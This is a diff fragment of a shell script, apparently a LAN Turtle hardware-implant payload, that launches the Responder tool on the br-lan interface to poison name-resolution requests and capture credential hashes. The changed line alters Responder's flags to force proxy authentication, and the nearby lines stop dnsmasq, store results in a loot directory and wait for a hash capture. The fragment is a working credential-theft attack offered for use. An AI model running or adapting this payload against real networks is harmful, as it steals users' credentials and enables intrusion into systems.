@@ -112,7 +112,7 @@ ln -s /root/loot/$(printf "%04u" $newdir) /etc/turtle/Responder/logs
 /etc/init.d/dnsmasq stop 1&> /dev/null
 
 # Execute attack
-screen -dmS responder bash -c 'cd /etc/turtle/Responder; python Responder.py -I br-lan -f -w -r -d -F'
+screen -dmS responder bash -c 'cd /etc/turtle/Responder; python Responder.py -I br-lan -w -r -d -P'
 
 # Blink upon hash capture
 while true; do
